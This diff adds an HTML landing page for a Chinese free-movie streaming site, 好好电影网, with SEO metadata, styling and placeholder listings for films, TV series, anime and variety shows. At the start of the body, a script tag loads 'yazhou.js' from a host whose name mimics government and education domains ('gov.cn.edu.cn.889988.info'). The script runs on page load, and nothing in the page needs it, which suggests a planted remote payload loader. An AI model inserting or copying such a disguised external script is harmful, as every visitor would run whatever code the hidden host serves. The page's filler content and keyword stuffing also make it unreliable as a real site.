@@ -1,0 +1,321 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>好好电影网 - 免费高清电影在线观看</title>
+<meta name="description" content="好好电影网提供最新高清电影、电视剧、动漫、综艺在线观看，免费无广告，尽在好好电影网。">
+<meta name="keywords" content="好好电影网, 高清电影, 在线观看, 免费电影, haohaodianyingwang">
+<meta name="author" content="好好电影网">
+<meta property="og:title" content="好好电影网 - 免费高清电影在线观看">
+<meta property="og:description" content="好好电影网提供最新高清电影、电视剧、动漫、综艺在线观看，免费无广告。">
+<meta property="og:url" content="https://haohaodianyingwang-app.github.io">
+<meta property="og:type" content="website">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "好好电影网",
+  "url": "https://haohaodianyingwang-app.github.io",
+  "description": "免费高清电影在线观看平台"
+}
+</script>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  font-family: "Microsoft YaHei", Arial, sans-serif;
+  background: #0b0e14;
+  color: #e2e8f0;
+  line-height: 1.6;
+}
+
+a { color: #00e5a0; text-decoration: none; }
+
+/* 导航 */
+header {
+  background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
+  padding: 1rem 2rem;
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  box-shadow: 0 2px 10px rgba(0,0,0,0.5);
+}
+.nav-container {
+  max-width: 1200px;
+  margin: auto;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+}
+.logo {
+  font-size: 1.8rem;
+  font-weight: bold;
+  color: #00e5a0;
+  text-shadow: 0 0 10px rgba(0,229,160,0.3);
+}
+nav ul {
+  list-style: none;
+  display: flex;
+  gap: 1.2rem;
+  flex-wrap: wrap;
+}
+nav a {
+  color: #cbd5e1;
+  font-size: 0.95rem;
+  padding: 0.4rem 0.8rem;
+  border-radius: 6px;
+  transition: all 0.3s;
+}
+nav a:hover {
+  background: rgba(0,229,160,0.15);
+  color: #00e5a0;
+}
+
+/* 主视觉 */
+.hero {
+  background: radial-gradient(circle at top, #1e293b 0%, #0b0e14 70%);
+  padding: 4rem 2rem;
+  text-align: center;
+}
+.hero h1 {
+  font-size: 2.5rem;
+  margin-bottom: 1rem;
+  color: #00e5a0;
+}
+.hero p {
+  font-size: 1.1rem;
+  max-width: 700px;
+  margin: 0 auto 2rem;
+  color: #94a3b8;
+}
+.cta-button {
+  display: inline-block;
+  background: #00e5a0;
+  color: #0b0e14;
+  padding: 0.8rem 2rem;
+  border-radius: 30px;
+  font-weight: bold;
+  transition: transform 0.3s;
+}
+.cta-button:hover {
+  transform: translateY(-3px);
+}
+
+/* 通用栏目 */
+.section {
+  padding: 3rem 2rem;
+  max-width: 1200px;
+  margin: auto;
+}
+.section h2 {
+  font-size: 1.8rem;
+  margin-bottom: 1.5rem;
+  color: #00e5a0;
+  border-left: 4px solid #00e5a0;
+  padding-left: 0.8rem;
+}
+
+/* 卡片网格 */
+.grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+  gap: 1.5rem;
+}
+.card {
+  background: #1e293b;
+  border-radius: 10px;
+  overflow: hidden;
+  transition: transform 0.3s;
+}
+.card:hover {
+  transform: translateY(-5px);
+}
+.card img {
+  width: 100%;
+  height: 160px;
+  object-fit: cover;
+  background: #334155;
+}
+.card-body {
+  padding: 1rem;
+}
+.card-body h3 {
+  font-size: 1.1rem;
+  margin-bottom: 0.5rem;
+}
+.card-body p {
+  font-size: 0.9rem;
+  color: #94a3b8;
+}
+
+/* 列表 */
+.list-item {
+  background: #1e293b;
+  padding: 1rem 1.2rem;
+  margin-bottom: 1rem;
+  border-radius: 8px;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+  flex-wrap: wrap;
+}
+.list-item h3 { font-size: 1.1rem; }
+.list-item span {
+  font-size: 0.85rem;
+  color: #94a3b8;
+}
+
+/* 关于 */
+.about-text {
+  background: #1e293b;
+  padding: 2rem;
+  border-radius: 10px;
+  font-size: 1rem;
+  color: #cbd5e1;
+}
+
+/* 页脚 */
+footer {
+  background: #0f172a;
+  padding: 2rem;
+  text-align: center;
+  font-size: 0.9rem;
+  color: #64748b;
+  margin-top: 2rem;
+}
+
+/* 移动端 */
+@media (max-width: 768px) {
+  .nav-container { flex-direction: column; gap: 1rem; }
+  nav ul { justify-content: center; }
+  .hero h1 { font-size: 2rem; }
+  .section { padding: 2rem 1rem; }
+  .list-item { flex-direction: column; align-items: flex-start; gap: 0.5rem; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<header>
+  <div class="nav-container">
+    <div class="logo">好好电影网</div>
+    <nav>
+      <ul>
+        <li><a href="#">首页</a></li>
+        <li><a href="#">电影</a></li>
+        <li><a href="#">电视剧</a></li>
+        <li><a href="#">动漫</a></li>
+        <li><a href="#">综艺</a></li>
+        <li><a href="#">关于我们</a></li>
+      </ul>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <h1>好好电影网 · 沉浸式观影体验</h1>
+  <p>免费高清电影、电视剧、动漫、综艺在线观看，无广告干扰，好好电影网让你尽情享受每一部佳作。</p>
+  <a href="#" class="cta-button">立即观影</a>
+</section>
+
+<section class="section" id="movies">
+  <h2>最新电影</h2>
+  <div class="grid">
+    <div class="card">
+      <img src="#" alt="电影封面">
+      <div class="card-body">
+        <h3>电影名称示例一</h3>
+        <p>动作 / 科幻 / 2024</p>
+      </div>
+    </div>
+    <div class="card">
+      <img src="#" alt="电影封面">
+      <div class="card-body">
+        <h3>电影名称示例二</h3>
+        <p>爱情 / 剧情 / 2024</p>
+      </div>
+    </div>
+    <div class="card">
+      <img src="#" alt="电影封面">
+      <div class="card-body">
+        <h3>电影名称示例三</h3>
+        <p>悬疑 / 犯罪 / 2024</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="tv">
+  <h2>热门电视剧</h2>
+  <div class="grid">
+    <div class="card">
+      <img src="#" alt="电视剧封面">
+      <div class="card-body">
+        <h3>电视剧名称示例一</h3>
+        <p>现代 / 都市 / 40集</p>
+      </div>
+    </div>
+    <div class="card">
+      <img src="#" alt="电视剧封面">
+      <div class="card-body">
+        <h3>电视剧名称示例二</h3>
+        <p>古装 / 玄幻 / 50集</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="anime">
+  <h2>动漫推荐</h2>
+  <div class="list-item">
+    <h3>动漫名称示例一</h3>
+    <span>更新至第12集</span>
+  </div>
+  <div class="list-item">
+    <h3>动漫名称示例二</h3>
+    <span>更新至第24集</span>
+  </div>
+  <div class="list-item">
+    <h3>动漫名称示例三</h3>
+    <span>完结</span>
+  </div>
+</section>
+
+<section class="section" id="variety">
+  <h2>综艺节目</h2>
+  <div class="grid">
+    <div class="card">
+      <img src="#" alt="综艺封面">
+      <div class="card-body">
+        <h3>综艺名称示例一</h3>
+        <p>真人秀 / 2024</p>
+      </div>
+    </div>
+    <div class="card">
+      <img src="#" alt="综艺封面">
+      <div class="card-body">
+        <h3>综艺名称示例二</h3>
+        <p>音乐 / 竞演 / 2024</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <h2>关于好好电影网</h2>
+  <div class="about-text">
+    <p><strong>好好电影网</strong>（<a href="https://haohaodianyingwang-app.github.io">haohaodianyingwang-app.github.io</a>）是一个专注于高清影视资源在线观看的免费平台。我们致力于为影迷提供最新、最热的电影、电视剧、动漫和综艺内容，界面简洁，体验流畅，是您观影的最佳选择。</p>
+  </div>
+</section>
+
+<footer>
+  <p>© 2024 好好电影网 | 网址：<a href="https://haohaodianyingwang-app.github.io">haohaodianyingwang-app.github.io</a></p>
+  <p>关键词：好好电影网</p>
+</footer>
+
+</body>
+</html>
